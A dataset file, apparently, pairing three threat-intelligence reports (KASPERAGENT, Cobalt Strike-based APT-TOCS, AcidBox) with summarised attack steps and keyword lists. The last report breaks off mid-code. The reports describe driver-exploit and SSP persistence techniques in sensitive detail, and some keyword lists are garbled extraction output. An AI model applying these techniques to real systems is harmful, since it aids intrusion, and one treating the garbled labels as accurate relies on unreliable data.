"June 14, 2017 Phantom of the Opaera: New KASPERAGENT Malware CampaignIn Blog, Featured Article, Threat ResearchKASPERAGENT Malware Campaign resurfaces in the run up to May Palestinian Authority ElectionsThreatConnect has identi ed a KASPERAGENT malware campaign leveraging decoy Palestinian Authority documents. The samples date from April - May 2017, coinciding with the run up to the May 2017 Palestinian Authority elections. Although we do not know who is behind the campaign, the decoy documents’ content focuses on timely political issues in Gaza and the IP address hosting the campaign’s command and control node hosts several other domains with Gaza registrants.In this blog post we will detail our analysis of the malware and associated indicators, look closely at the decoy  les, and leverage available information to make an educated guess on the possible intended target. Associated indicators and screenshots of the decoy documents are all available here[url campaign=4219181] in the ThreatConnect platform.Some of the indicators in the following post were published on AlienVault OTX on 6/13.Background on KASPERAGENTKASPERAGENT is Microsoft Windows malware used in e orts targeting users in the United States, Israel, Palestinian Territories, and Egypt since July 2015. The malware was discovered by Palo Alto Networks Unit 42 and ClearSky Cyber Security, and publicized in April 2017 in the Targeted Attacks in the Middle East Using KASPERAGENT and MICROPSIA [url attacks-middle-east-using-kasperagent-micropsia/] blog. It is called KASPERAGENT based on PDB strings identi ed in the malware such as “c:\Users\USA\Documents\Visual Studio 2008\Projects\New folder (2)\kasper\Release\kasper.pdb.”The threat actors used shortened URLs in spear phishing messages and fake news websites to direct targets to download KASPERAGENT. Upon execution, KASPERAGENT drops the payload and a decoy document that displays Arabic names and ID numbers. The malware establishes persistence and sends HTTP requests to the command and control domain mailsinfo[.]net. Of note, the callbacks were to PHP scripts that included /dad5/ in the URLs. Most samples of the malware reportedly function as a basic reconnaissance tool and downloader. However, some of the recently identi ed  les display “extended- capability” including the functionality to steal passwords, take screenshots, log keystrokes, and steal  les. These “extended-capability” samples called out to an additional command and control domain, stikerscloud[.]com. Additionally, early variants of KASPERAGENT used “Chrome” as the user agent, while more recent samples use “OPAERA” - a possible misspelling of the “Opera” - browser. The indicatorsassociated with the blog article are available in the ThreatConnect Technical Blogs and Reports source here [url incident=4003314] .The samples we identi ed leverage the same user agent string “OPAERA [url id=29927402&owner=Common+Community] ”, included the kasper PDB string reported by Unit 42, and used similar POST and GET requests. The command and control domains were di erent, and these samples used unique decoy documents to target their victims.Identifying another KASPERAGENT campaignWe didn’t start out looking for KASPERAGENT, but a  le hit on one of our YARA rules for an executable designed to display a fake XLS icon - one way adversaries attempt to trick targets into thinking a malicious  le is innocuous. The  rst malicious sample we identi ed (6843AE9EAC03F69DF301D024BFDEFC88 [url le.xhtml?  le=6843AE9EAC03F69DF301D024BFDEFC88] ) had the  le name “testproj.exe” and was identi ed within an archive  le (4FE7561F63A71CA73C26CB95B28EAEE8 [url le.xhtml?  le=4FE7561F63A71CA73C26CB95B28EAEE8] ) with the name “ﻝﻳﺻﺎﻔﺗﻟﺍ ءﺎﻬﻘﻓ ﻝﺎﻳﺗﻏﻷ ﺔﻠﻣﺎﻛﻟﺍ.r24”. This translates to “The Complete Details of Fuqaha's Assassination”, a reference to Hamas military leader Mazen Fuqaha who was assassinated [url fuqaha-hamas-killing-israel.html] on March 24, 2017.We detonated the  le in VxStream’s automated malware analysis and found testproj.exe dropped a benign Microsoft Word document that pulls a jpg  le from treestower[.]com [url host=www.treestower.com&owner=Common+Community] . Malwr.com observed this site in association with another sample that called out to mailsinfo[.]net - a host identi ed in the Targeted Attacks in the Middle East Using KASPERAGENT and MICROPSIA [url attacks-middle-east-using-kasperagent-micropsia/] blog. That was our  rst hint that we were looking at KASPERAGENT.The jpg pulled from treestower[.]com displays a graphic picture of a dead man, which also appeared on a Palestinian news website discussing the death of Hamas military leader Mazen Fuqaha. A separate malicious executable - 2DE25306A58D8A5B6CBE8D5E2FC5F3C5 [url environmentId=100] (vlc.exe) - runs when the photograph is displayed, using the YouTube icon and calling out to several URLs on windowsnewupdates[.]com [url host=windowsnewupdates.com&owner=Common+Community] . This host was registered in late March and appears to be unique to this campaign.With our interest piqued, we pivoted on the import hashes (also known as an imphash), which captures the import table of a given  le. Shared import hashes across multiple  les would likely identify  les that are part of the same malware family. We found nine additional samples sharing the imphash values for the two executables, C66F88D2D76D79210D568D7AD7896B45 [url  lters=typeName%20in%20(%22Address%22%2C%20%22EmailAddress%22%2and DCF3AA484253068D8833C7C5B019B07 [url  lters=typeName%20in%20(%22Address%22%2C%20%22EmailAddress%22%2 0B4E44256788783634A2B1DADF4F9784 [url  lters=typeName%20in%20(%22Address%22%2C%20%22EmailAddress%22%2and E44F0BD2ADFB9CBCABCAD314D27ACCFC [url  lters=typeName%20in%20(%22Address%22%2C%20%22EmailAddress%22%2 , for a total of 20 malicious  les. These additional samples behaved similarly to the initial  les; testproj.exe dropped benign decoy  les and started malicious executables. The malicious executables all called out to the same URLs on windowsnewupdates[.]com.These malware samples leverage the user agent string “OPAERA,” the same one identi ed in the Targeted Attacks in the Middle East Using KASPERAGENT and MICROPSIA [url attacks-middle-east-using-kasperagent-micropsia/] blog. Although the command and control domain was di erent from those in the report, the POST and GET requests were similar and included /dad5/ in the URL string. In addition, the malware samples included the kasper PDB string reported by Unit 42, prompting us to conclude that we were likely looking at new variants of KASPERAGENT.The Decoy FilesSeveral of the decoy  les appeared to be o cial documents associated with the Palestinian Authority - the body that governs the Palestinian Territories in the Middle East. We do not know whether the  les are legitimate Palestinian Authority documents, but they are designed to look o cial. Additionally, most of the decoy  les are publicly available on news websites or social media.The  rst document - dated April 10, 2017 - is marked “Very Secret” and addressed to Yahya Al-Sinwar, who Hamas elected as its leader in Gaza in February 2017. Like the photo displayed in the  rst decoy  le we found, this document references the death of Mazen Fuqaha. The Arabic-language text and English translation of the document are available in ThreatConnect here[url document=4219292] . A screenshot of the  le is depicted below.The second legible  le, dated April 23, has the same letterhead and also is addressed to Yahya al-Sinwar. This  le discusses the supposed announcement banning the rival Fatah [url political party, which controls the West Bank, from Gaza. It mentions closing the Fatah headquarters and houses that were identi ed as meeting places as well as the arrest of some members of the party.Looking at the InfrastructureWe don’t know for sure who is responsible for this campaign, but digging into the passive DNS results led us to some breadcrumbs. Starting with 195.154.110[.]237 [url address which is hosting the command and control domainwindowsnewupdates[.]com, we found that the host is on a dedicated server.ThreatConnect DomainTools Integration ResultsUsing our Farsight DNSDB integration, we identi ed other domains currently and previously hosted on the same IP.Reverse DNS and Passive DNS results for 195.154.110[.]237Two of the four domains that have been hosted at this IP since 2016 -- up le2box[.]com and 7aga[.]net -- were registered by a freelance web developer in Gaza, Palestine. This IP has been used to host a small number of domains, some of which were registered by the same actor, suggesting the IP is dedicated for a single individual or group’s use. While not conclusive, it is intriguing that the same IP was observed hosting a domain ostensibly registered in Gaza AND the command and control domain associated with a series of targeted attacks leveraging Palestinian Authority-themed decoy documents referencing Gaza.Targeting Focus?Just like we can’t make a de nitive determination as to who conducted this campaign, we do not know for sure who it was intended to target. What we do know is that several of the malicious  les were submitted to a public malware analysis site from the Palestinian Territories. This tells us that it is possible either the threat actors or at least one of the targets is located in that area. Additionally, as previously mentioned, the decoy document subject matter would likely be of interest to a few di erent potential targets in the Palestinian Territories. Potential targets such as Hamas who controls the Gaza strip and counts Mazen Fuqaha and Yahya al-Sinwar as members, Israel which is accused of involvement in the assassination of Mazen Fuqaha [url fuqaha-hamas-killing-israel.html] , and the Fatah party of which the Prime Minister and President of the Palestinian Authority are members.The campaign corresponds with a period of heightened tension in Gaza. Hamas, who has historically maintained control over the strip, elected Yahya al-Sinwar - a hardliner from its military wing - as its leader in February. A Humanitarian Bulletin [url by the United Nations’ O ce for the Coordination of Humanitarian A airs indicates in March 2017 (just before the  rst malware samples associated with this campaign were identi ed in early April) Hamas created “a parallel institution to run local ministries in Gaza,” further straining the relationship between Hamas and the Palestinian Authority who governs the West Bank. After this announcement, the Palestinian Authority cut salaries for its employees in Gaza by 30 percent and informed Israel that it would no longer pay for electricity provided to Gaza [url authority-hamas-gaza-electricity.html] causing blackouts throughout the area and escalating tensions between the rival groups. Then, in early May (two days after the last malware sample was submitted) the Palestinian Authority held local elections [url local-elections-test-fatah-party-47389952] in the West Bank which were reportedly seen as a test for the Fatah party. Elections were not held in Gaza.All of that is to say, the decoy documents leveraged in this campaign would likely be relevant and of interest to a variety of targets in Israel and Palestine, consistent with previously identi ed KASPERAGENT targeting patterns. Additionally, the use of what appear to be carefully crafted documents at the very least designed to look like o cial government correspondence suggests the malware may have been intended for a government employee or contractor who would be interested in the documents’ subject matter. More associated indicators, screenshots of many of the decoy documents, and descriptions of the activity are available via the March - May 2017 Kasperagent Malware Leveraging WindowsNewUpdates[.]com Campaign [url campaign=4219181] in ThreatConnect.Categories: Blog , Featured Article , Threat ResearchABOUT THE AUTHORThe ThreatConnect Research Team: is an elite group of globally- acknowledged cybersecurity experts, dedicated to tracking down existing and emerging cyber threats. We scrutinize trends, technology and socio-political motivators to develop comprehensive knowledge of the cyber landscape. Then, we share what we’ve learned so that you can protect your organization, and your team can take precise action against threats. "," 1. Shortened URLs were used in spear phishing emails to direct targets to download malware. 2. Upon execution, the malware (KASPERAGENT variants) drops a decoy document and starts additional malicious executables. 3. The malicious executables communicate with command and control domains such as windowsnewupdates[.]com. 4. The malware establishes persistence and sends HTTP requests to the C2. 5. The decoy documents look like official Palestinian Authority correspondence and reference recent political events. 6. The malware samples were submitted from systems in the Palestinian Territories, suggesting targets there. 7. The command and control IP address has also hosted domains registered to individuals in Gaza. 8. The campaign timeline aligns with heightened tensions between Hamas and the Palestinian Authority. ",valid_71,"['Shortened URLs', 'use', 'spear', 'direct targets', 'execution', 'KASPERAGENT', 'a decoy document', 'addition', 'The malicious executables', 'command and control domains', 'windowsnewupdates[.]com', 'persistence', 'HTTP requests', 'the decoy documents', 'cial', 'reference', 'the malware samples', 'the Palestinian Territories', 'the command', 'IP', 'host', 'Gaza', 'the campaign', 'heightened tension', 'tensions', 'Hamas', 'the Palestinian Authority']",Shortened URLs; use; spear; direct targets; execution; KASPERAGENT; a decoy document; addition; The malicious executables; command and control domains; windowsnewupdates[.]com; persistence; HTTP requests; the decoy documents; cial; reference; the malware samples; the Palestinian Territories; the command; IP; host; Gaza; the campaign; heightened tension; tensions; Hamas; the Palestinian Authority.
"ANALYSIS ON APT-TO-BE ATTACK THATFOCUSING ON CHINA'S GOVERNMENTAGENCYAntiy CERTFirst release time: 14:32, May 27, 2015Updated time of this version: 14:32, May 27, 2015Analysis on APT-to-be Attack That Focusing on China's Government AgencyContents1 2BACKGROUND 1 ANALYSIS ON INCIDENT SAMPLE 12.1LEADING FILES AND SAMPLE DOWNLOADING 12.2KEY MECHANISM 32.3ANALYSIS ON THE MAJOR SAMPLE (SAMPLE B) OF APT-TOCS 32.4ANALYSIS ON SCRIPT 1 32.5ANALYSIS ON MODULE 1 42.6ANALYSIS ON MODULE 2 52.7ANALYSIS ON MODULE 3 63THE AUTHENTICATION ANALYSIS ON THE TECHNOLOGY SOURCES OF THIS ATTACK 73.1COMPARISON OF MODULE 1 83.2COMPARISON OF DISASSEMBLING COMMANDS OF MODULE 2 93.3COMPARISON ANALYSIS ON MODULE 3 DATA PACKAGE 103.4CHARACTERISTICS OF COBALT STRIKE 11CONCLUSION 11 4 APPENDIX 1 REFERENCES OF COBALT STRIKE AND THE AUTHOR 12 ption at t h e e n t r y a_nai)Sample module 2Relevant Beacon files© Antiy Labs. All rights reserved.Page 9Analysis on APT-to-be Attack That Focusing on China's Government AgencyThe calls3.3 Comparison analysis on module 3 data packageThe following figure is the GET request comparison of the module generated by sample module 3 and Beacon.Here we can see both of them use Cookie to transmit information that has been encrypted, and send requestsactively every 60 seconds. The data package is heartbeat.© Antiy Labs. All rights reserved.Page 10Analysis on APT-to-be Attack That Focusing on China's Government AgencyFigure 16 Comparison of module 3 data package3.4 Characteristics of Cobalt StrikeUsing Cobalt Strike attack can execute various operations in the targeted systems, such as downloading anduploading files, executing designated programs, injecting keyboard recorder, executing commands via PowerShell,importing PowerShell script, executing commands via CMD, accessing system passwords and so on.Cobalt Strike has the following characteristics: Penetrating sandbox Avoiding whitelist mechanism and cloud detectionIntranet penetration Persistent attacks Attacking various platforms4 ConclusionWith an automated test platform Cobalt Strike, the attack penetration can penetrate firewall, the approach theattackers used to control targeted host is covert and undetectable; what’s more, it can attack various platforms, such© Antiy Labs. All rights reserved.Page 11Analysis on APT-to-be Attack That Focusing on China's Government Agencyas Windows, Linux, Mac etc.; it’s formidable adversary to Trusted Computing, Cloud Detection, SandboxDetection and so on. According to the traces in the past, we believe that the threat has been active for 5 years;unfortunately, there isn’t any powerful detection production and methods to defeat the malicious attack till now.The reason why the CERT Analysis Team of ANTIY classified APT-TOCS into APT incidents is that it’s a kind oftargeted attack (one of the features of APT attack), it has anti-detection functions and also it can conceal itself.Compared with APT incidents in the past, the APT attack in this case doesn’t cost too much, and the attackersaren’t responsible for coding. With the application of commercial attack platform, the attackers saved the cost ofan attack, also the vulnerability built joint function provided by relevant attack platform make the attackers easy todo injection. As a result, nations and organizations which without its own elite hacker groups and abundant capitalcan also launch some kind of APT attack via the attack pattern mentioned in this case. Meanwhile, it’s moredifficult for us to tracing when facing such modeled attack.One of the leaders in Information Security area-Bruce Schiner said, “when big events on information securityhappened, people tend to treat it as an example of cyber warfare. It’s ridiculous. From my point of view, what’shappening and going to happen is: more and more tactics in physical warfare are applied to cyber warfare. It’simportant to note that, attack capabilities can be widely distributed if attackers take full advantages of certaintechnology, especially computer technology can make attack more powerful and automated.” Obviously, highlyautomated commercial platform realized a high speed of spread of this attack capability (exceeded ouranticipation).We have to remind all relevant parties that we are confronting with the risk of large scale diffusion of networkarmaments which is led by the low cost of the attack capability. The commercial penetration attack detectingplatform has two sides, on one hand, it can check the network environment of systems effectively, on the other hand,for nations, organizations and industries which has limited budget, it costs too much. Given the situation, all relatedparties should conduct more communication with each other, additionally, there is no doubt that both offensiveparty and defensive party are supported by superpowers, these superpowers should prevent the attack techniquefrom widely distributing.The incident mentioned there has no difference with other cases we detected in the past, it shows that, on the way torealize national informatizaion, we must fight against serious security challenges as we confronting now; it’s also agood opportunity for our Chinese people and enterprises to demonstrate our faith and the efforts we made toconquer the challenge.Appendix 1 References of Cobalt Strike and the authorCobalt Strike is the business version of Armitage which is the penetration testing software of Metasploit figureinterface written by Java. Armitage can carry out automatic attacks by combining with known exploits ofMetasploit. It integrates the free version of Armitage under bt5 and kali linx, and the most powerful functionality isadding the Payload of Beacon.The first release time of Cobalt Strike is June, 2012.VersionDescriptionCobalt Strike1.45 andtheIt can connect the metasploit of Windows. Then it must connect metasploit of Linux.© Antiy Labs. All rights reserved.Page 12Analysis on APT-to-be Attack That Focusing on China's Government Agencyformer versionsCobalt Strike1.46System analyzer used return steps to check on Java report version, and fixed the exploits generatedby private key.Cobalt Strike1.47Relieved multiple Beacon information backlog; had a overall check when dictograph was on.Cobalt Strike1.48Adding timestomp command to Beacon; the waiting time of copying bypassuac privilege filesCobalt Strike1.49Fixed Beacon HTTP Stager payload generator of Windows XP.lasted 10 seconds.Cobalt Strike2.0Cobalt Strike2.1Cobalt Strike2.2C&C of plasticity, adding option “veil” to the payload generator.PowerShell command started major local PowerShell; updated build.sh tool.Reconstructed the VNC server of process injecting and connecting with targeted system. The newprocess is easier to be neglected due to the host firewall. The exploit report showed URL quotesfrom ZDI, MSB, US-CERT-VU and WPVDB.Cobalt Strike2.3Compiled the DNS field of Beacon with customized encoder. Beacon added command runas andpwd.Cobalt Strike2.4Adding time stamp to view - >web log; regenerating new default Beacon HTTPS certification withdifferent parameters; then generating C2 HTTPS certification; updating executable files and defaulttool kit of DLLS.Author of Cobalt Strike: Raphael MudgeRaphael Mudge is the founder of Strategic Cyber LLC, a Washington, DC based company that creates software forred teams. He created Armitage for Metasploit, the Sleep programming language, and the IRC client jIRCii.Previously, Raphael worked as a security researcher for the US Air Force, a penetration tester, and he even inventeda grammar checker that was sold to Automattic. His work has appeared in Hakin9, USENIX ;login:, Dr. Dobb'sJournal, on the cover of the Linux Journal, and the Fox sitcom Breaking In. Raphael regularly speaks on securitytopics and provides red team support to many cyber defense competitions.Education background: Syracuse University, Michigan Technological UniversityCurrent position: Strategic Cyber LLC , Delaware Air National GuardSkills: software development, information security, object-oriented design, distributed system, figure interface,computer network design, blog system, social engineering, security research and so on.© Antiy Labs. All rights reserved.Page 13Analysis on APT-to-be Attack That Focusing on China's Government AgencyCompany/Project/OrganizationPostionTimeStrategic cyber LLCFounder and PrincipalJanuary, 2012-nowDelaware Air National GuardMajor2009-nowCobalt strikeTDIAutomatticPrincipal InvestigatorNovember, 2011- May, 2012Senior Security EngineerAugust, 2010 – June, 2011Code WranglerJuly, 2009 – August, 2010Feedback Army, After the DeadlineFounderJuly, 2008 –November, 2009Air Force Research LaboratorySystems EngineerApril, 2006 – March, 2008US Air ForceCommunications andMarch, 2004 - March, 2008Information OfficerSupported organizations:Collegiate Cyber Defense Competition (CCDC)North East CCDC 2008-2015Mid Atlantic CCDC 2011-2015Pacific Rim CCDC 2012, 2014South East CCDC - 2014Western Regional CCDC - 2013National CCDC 2012-2014Projects: Sleep Scripting LanguageAn extensible general purpose language with Perl inspired syntax for the Java platform. Sleep is open source,licensed under the LGPL.jIRCiiScriptable Internet Relay Chat client for Windows, MacOS X, and Linux. jIRCii is open source, licensedunder the artistic license.Published works:Live-fire Security Testing with Armitage and MetasploitGet in through the backdoor: Post exploitation with ArmitageTutorial: Hacking Linux with Armitage© Antiy Labs. All rights reserved.Page 14Analysis on APT-to-be Attack That Focusing on China's Government AgencyThe Design of a Proofreading Software ServiceAgent-based Traffic GenerationContribution:cortana-scriptsmetasploit-loadermalleable-c2-profileslayer2-privoting-clientarmitageProjects:Enterprise-level business cooperationAfter the DeadlineFeedback ArmyCobalt StrikeOpen source softwareArmitageFar EastjIRCiiMocontiOne Hand Army Man sphPERL Same GameSleepReference linking:url （google+）url (GitHub)url (youtube)url~raffi/index.htmlurl© Antiy Labs. All rights reserved.Page 15Analysis on APT-to-be Attack That Focusing on China's Government Agencyurl 2 About AntiyAntiy Labs is a professional next-generation security-testing engine R&D enterprise. Antiy’s engines provide theability to detect various viruses and malware for network security products and mobile devices, which are used bymore than ten well known security vendors. Antiy’s engines are embedded in tens of thousands of firewalls and tensof millions of mobile phones all over the world. Antiy Labs is awarded the “Best Protection” prize by AV-TEST in2013. Based on engines, sandboxes and background systems, Antiy Labs will continue to provide traffic-basedanti-APT solutions for enterprises.More information about antivirus engine,url (Chinese)More information about anti-APT products ofurl (English)Antiy,© Antiy Labs. All rights reserved.Page 16 ",1. The attack process starts with a downloader script that fetches and executes shellcode generated by Cobalt Strike. 2. The shellcode establishes command execution and data exfiltration capabilities while evading detection. ,valid_57,"['h', 'Attack', 'process', 'Cobalt Strike', 'detection']",h; Attack; process; Cobalt Strike; detection.
"6/18/2020AcidBox: Rare Malware Repurposing Turla Group Exploit Targeted Russian OrganizationsAcidBox: Rare Malware Repurposing Turla Group Exploit Targeted Russian Organizationsunit42.paloaltonetworks.com/acidbox-rare-malwareDominik Reichel, Esmid IdrizovicJune 17, 2020Executive SummaryWhen the news broke in 2014 about a new sophisticated threat actor dubbed the Turla Group, which the Estonian foreign intelligence service believes has Russian origins and operates on behalf of the FSB, its kernelmode malware also became the first publicly- described case that abused a third-party device driver to disable Driver Signature Enforcement (DSE). This security mechanism was introduced in Windows Vista to prevent unsigned drivers from loading into kernel space. Turla exploited the signed VirtualBox driver, VBoxDrv.sys v1.6.2, to deactivate DSE and load its unsigned payload drivers afterward.There is some confusion about this exploit, however, as it’s often generally referred to as CVE-2008-3431. The exploit used by Turla actually abuses two vulnerabilities — of which, only one was ever fixed in the aforementioned CVE. The other vulnerability was found by Turla and is used in the first version of their exploit, along with CVE-2008-3431. The second version of their exploit, presumably introduced in 2014 of their kernelmode malware, only uses the unpatched vulnerability, which we discuss in greater detail later.In February 2019, Unit 42 found that a yet-to-be-known threat actor — unbeknownst to the infosec community — discovered that the second unpatched vulnerability can not only exploit VirtualBox VBoxDrv.sys driver v1.6.2, but also all other versions up to v3.0.0. Furthermore, our research shows that this unknown actor exploited VirtualBox driver version 2.2.0 to target at least two different Russian organizations in 2017, which we are revealing for the first time. We anticipate this was done because the driver version 2.2.0url Rare Malware Repurposing Turla Group Exploit Targeted Russian Organizationswasn’t known to be vulnerable and thus most likely is not on the radar of security companies being exploited. Since no other victims have been found, we believe this is a very rare malware used in targeted attacks only.The actors used a previously unknown malware family that we have dubbed AcidBox due to the first part being an anagram of the malware’s driver device name and the second part taken from VirtualBox. Because of the malware’s complexity, rarity, and the fact that it’s part of a bigger toolset, we believe it was used by an advanced threat actor for targeted attacks and it’s likely that this malware is still being used today if the attacker is still active. However, we anticipate that it was rewritten to a certain extent. Based on the information we have, we don’t believe this unknown threat actor is tied to Turla, except for the used exploit.Palo Alto Networks customers are protected from this threat. Our threat prevention platform with WildFire identifies this malware as malicious. AutoFocus customers can track malware activity by using the AcidBox tag. We also created an Adversary Playbook for this attack, which can be found here.The Unknown Threat ActorIn February 2019, we discovered a sample of AcidBox (SHA256: VirusTotal, which contained a string known to be used in Turla’s VirtualBox exploit. A deeper analysis of the sample revealed it’s the main worker module as part of a sophisticated malware that we couldn’t tie to any known threat actor.In collaborating with our colleagues at Dr.Web, we learned that this sample was used in a targeted attack on an unspecified entity in Russia back in 2017. Thankfully, they shared three additional samples of the same malware family. Two of those usermode samples are modules that load the main worker from the Windows registry and one is the kernelmode payload driver embedded in the main worker sample. Moreover, we contacted Kaspersky since the company is headquartered in Russia, which found only one additional sample in their databases that was also the usermode loader version. We also contacted ESET, which didn’t find any victims infected with this malware, just like in our own case. For this reason, we conclude it’s a very rare malware used in targeted attacks only.What all the samples have in common are the compilation timestamps of May 9, 2017. This date seems legitimate, as the sample found by Kaspersky appeared in June 2017 in their databases. Therefore, we conclude that the campaign which involved this malware took place in 2017. We couldn’t find any newer samples and thus it’s unknown if AcidBox is still in use or has been further developed.We compared the specific characteristics of the samples to all publicly-known malware, but couldn’t find any clear overlaps. There are some very loose similarities to Remsec malware attributed to ProjectSauron, like:url Rare Malware Repurposing Turla Group Exploit Targeted Russian OrganizationsDWORD size data marker values Export function names made of 2/3 words MS Visual C/C++ compiler used Various import API functions overlaps Use of vulnerable 3rd party driver to load own unsigned driver Zlib compression used Sensitive data encrypted in the resource sectionHowever, based on these facts alone, it’s not possible to attribute the samples to the ProjectSauron threat actor. We think it’s more likely this is a yet unknown threat actor.The VirtualBox Exploit and Turla’s VersionsThe original vulnerability described in CVE-2008-3431 was found by Core Security in 2008 and affected VBoxDrv.sys less or equal version 1.6.2. It was fixed in version 1.6.4 and thus couldn’t be exploited anymore.Figure 1. Vulnerable and patched VirtualBox device dispatch handler routines on the left andright, respectivelyThe vulnerability is located in the dispatch device control routine called VBoxDrvNtDeviceControl. On versions prior to 1.6.4, you can call the usermode DeviceIoControl API function and send one of the following control codes together with a kernel address you want to overwrite as the input/output buffer:SUP_IOCTL_FAST_DO_RAW_RUN SUP_IOCTL_FAST_DO_HM_RUN SUP_IOCTL_FAST_DO_NOPThe kernel address is passed down to the control handler (see Figure 1 left, line 28) without any check or validation and is filled with the return value of supdrvIOCtlFast (see Figure 1 left, line 24). This is where the vulnerability digging from CoreSecurity stops and where Turla continues. In the original exploit, the return value from supdrvIOCtlFast isn’turl Rare Malware Repurposing Turla Group Exploit Targeted Russian Organizationscontrolled and thus it will be a random value written to your kernel address. Turla’s exploit controls the return value by overwriting the function pointer of supdrvIOCtlFast to redirect execution to a small shellcode, which returns the needed value. This was described in great detail in a couple of articles and the complete reverse-engineered exploit code is also available.The patched version 1.6.4 (see Figure 1 right) doesn’t use the UserBuffer pointer anymore, which could be abused by passing a kernel address. Additionally, it checks if the rc variable is equal or bigger than zero — which isn’t needed for the patch, but more like a sanity check.With this patch, the original vulnerability to overwrite a kernel address was fixed. The other vulnerability that lets you control the function pointer of supdrvIOCtlFast remained unpatched. Of course, that’s because it wasn’t discovered by Core Security at the time, but only a few years later by the Turla threat actor.While Turla still uses the vulnerable VirtualBox driver v.1.6.2 to date, it only makes use of the unpatched vulnerability. The reason why and how it uses it was described by Lastline, and also the reverse-engineered exploit code is available in a project named Turla Driver Loader.The secret is the exact same exploit, with only a small modification — which we won’t disclose here — can be used on all VBoxDrv.sys versions up to 3.0.0. This was also figured out by an unknown threat actor. While VirtualBox versions smaller than 4.0 aren’t available on the official website anymore, they can still be found on some software download sites.Starting from version 3.0.0, some structures and routines have changed so the exploit does not work anymore. However, it can’t be ruled out that in later versions it’s still possible to exploit the same vulnerability with some more adjustments.What’s also interesting is that not even the Turla authors themself seem to have realized that. They still use the old VBoxDrv.sys v.1.6.2 in their otherwise stealthy exploit. This driver is widely known to be used for malicious or various otherwise dubious purposes, for example, in-game cheats.Technical Analysis of AcidBoxThe malware is a complex modular toolkit of which we have only a part of it. In total, we have found four 64-bit usermode DLLs and an unsigned kernelmode driver (SHA256: of the four usermode samples have identical functionality and are loaders for the main worker module. They only differ in their file descriptions and the embedded and encrypted registry path. These loaders are created as security support providers (further SSP). A SSP is a DLL that exports at least the function SpLsaModeInitialize and usually provides security mechanisms such as authentication between client/server applications. There are a couple of standard SSPs provided in Windows such as Kerberos (kerberos.dll)url Rare Malware Repurposing Turla Group Exploit Targeted Russian Organizationsor NTLM (msv1_0.dll). You can abuse the SSP interface for malware persistency and also for injection purposes. In order to maintain persistency, you have to put your SSP DLL into the Windows system directory and add the name of your DLL to a certain registry value. Upon a system restart, your DLL gets loaded into the Windows lsass.exe process and is executed. If you just want your SSP DLL to be injected into lsass.exe, you can call the API function AddSecurityPackage which triggers immediate loading. Of course, you need at least admin privileges for both of these methods. The first case of a malware abusing the SSP interface was mentioned by Matt Graeber in 2014. Since then, this persistence and injection trick has become wider known, but it’s still rarely used in malware.In case of the three AcidBox SSP DLLs, they don’t make use of any security related operations, but purely abuse this interface for injection purposes and most likely also for persistence. The three SSPs have different file names that are similar to the standard packages provided in Windows (msv1_0.dll, pku2u.dll, wdigest.dll):msv1_1.dll (SHA256: pku.dll (SHA256: windigest.dll (SHA256: However, as we don’t have the component which installs the SSP DLLs, we don’t know for sure. What we know is that the SSP interface is used for injection into lsass.exe, as they check at the beginning whether the process path they’re loaded into matches the oneurl Rare Malware Repurposing Turla Group Exploit Targeted Russian Organizationswhich is embedded into every sample in the resource section (C:\WINDOWS\SYSTEM32\lsass.exe). This process path is contained in the resource 4097 which we describe later how it is hidden via steganography.The purpose of the AcidBox SSP DLLs is to load the main worker module from a registry value contained in resource 256 of each sample. We don’t know how the main worker DLL was stored in the registry, but we believe it was done by the same missing component which installed the SSP DLLs. We also assume that the three SSP DLLs are from three different systems as one of those samples has a different registry key embedded. Also, as these modules are the only visible part on a system — with the main worker module being loaded remains encrypted in the registry — they likely differ in some way like their chosen file name. The main worker is stored in the registry encrypted within a data blob that contains various other metadata such as the CRC32 hash of the data blob or magic byte sequences which indicate different types of contained data.After the main worker DLL gets decrypted by a SSP DLL from the registry via simply XORing the data with key 0xCA, it gets prepared to be loaded from memory. It does so by creating a thread for the module and uses the exported function UpdateContext of the main worker as its start address. The main worker module then loads the unsigned malware driver via the VirtualBox exploit and waits for commands from one or more components that we don’t have. These commands include the loading of additional payloads from the registry from kernel space via the driver or the installation of new SSP DLLs.The main worker has 2 export functions named InitMainStartup and UpdateContext. The following strings are present in cleartext:url Rare Malware Repurposing Turla Group Exploit Targeted Russian Organizations12345678910111213141516171819%s\%s%s\%s{%s}%s\[[%s]]%s.dll%s%s%s.dll\\.\PCIXA_CFGDEVInitEntryInitExitThe Magic Word!ntoskrnl.exentkrnntkrphal.dllntoskrnlntkrnlpa.exe%s%s%sGroupCountNextInstance20Root\LEGACY_NULL\0000212223242526The following additional strings are stack obfuscated:url Rare Malware Repurposing Turla Group Exploit Targeted Russian OrganizationsSeLoadDriverPrivilege%s\%c*.dllSystem\CurrentControlSet\Control\NtQueryInformationThreadBFE_Notify_Event_Microsoft\Cryptographyntdll.dll\Registry\Machine\SOFTWAREGlobal%s\%sSecurity Packageskernel32.dllSOFTWARE\Registry\Machine\MachineGuidntdll.dll12345678910111213141516171819There are also XOR-encoded DLL and function names, which later get dynamically resolved and used:123456ntdll.RtlGetVersionntdll.ZwLoadDriverntdll.ZwUnloadDriverntdll.ZwQuerySystemInformationkernel32.DeviceIoControlkernel32.GetSystemDirectoryAurl Rare Malware Repurposing Turla Group Exploit Targeted Russian Organizations78910111213141516171819ntdll.RtlAnsiStringToUnicodeStringntdll.ZwClosentdll.ZwCreateFilentdll.ZwQueryInformationFilentdll.ZwReadFilentdll.ZwWriteFilekernel32.GetSystemDirectoryAkernel32.GetSystemDirectoryWkernel32.BaseThreadInitThunkkernel32.LZDoneadvapi32.CryptAcquireContextAadvapi32.CryptGenRandomadvapi32.CryptReleaseContext20ntdll.RtlRbInsertNodeEx2122232425262728293031323334ntdll.RtlRbRemoveNodentdll.RtlAcquireSRWLockExclusiventdll.RtlReleaseSRWLockExclusiventdll.RtlEnterCriticalSectionntdll.RtlPcToFileHeaderntdll.RtlGetVersionntdll.RtlUpcaseUnicodeCharntdll.RtlAnsiStringToUnicodeStringntdll.LdrLockLoaderLockntdll.LdrUnlockLoaderLockntdll.ZwClosentdll.ZwCreateSectionntdll.ZwMapViewOfSectionntdll.ZwUnmapViewOfSectionurl Rare Malware Repurposing Turla Group Exploit Targeted Russian OrganizationsAll the functionality is contained in the two export functions, while DllMain does not contain any relevant code. What stands out is the extensive use of custom DWORD-size status codes throughout the code. Decompiled code example with status codes in result variable:12345678910111213141516171819…if ( !a1 || !a2 || !(_DWORD)v3 ){result = 0xA0032B02;goto LABEL_45;}if ( strlen(a1) <= 1 )goto LABEL_65;result = get_kernel32_path(a1, &v43, &v37, &v41);if ( result )goto LABEL_45;if ( (unsigned int)v3 < 0x1C ){LABEL_65:result = 